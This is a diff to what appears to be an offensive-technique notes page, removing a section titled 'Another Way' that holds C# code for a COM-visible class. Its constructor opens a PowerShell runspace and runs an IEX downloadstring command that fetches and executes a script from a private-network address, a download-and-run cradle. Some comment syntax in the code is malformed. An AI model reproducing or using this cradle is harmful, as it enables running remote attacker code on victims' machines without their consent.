@@ -33,29 +33,3 @@ public class Program
 }
 ```
 
-### Another Way
-```
-using System;
-using System.Runtime.InteropServices;
-using System.Management.Automation.Runspaces;
-
-
-namespace executive {
-
-	[ComVisible(true)]
-	public class executive \\Class
-	{
-	    public executive() \\direct call Class
-	    {
-	       RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
-			Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
-			rspace.Open();
-			Pipeline pipeline = rspace.CreatePipeline();
-			pipeline.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://192.168.200.128:80/a'))");
-			pipeline.Invoke();
-	    }
-	}
-}
-
-
-```
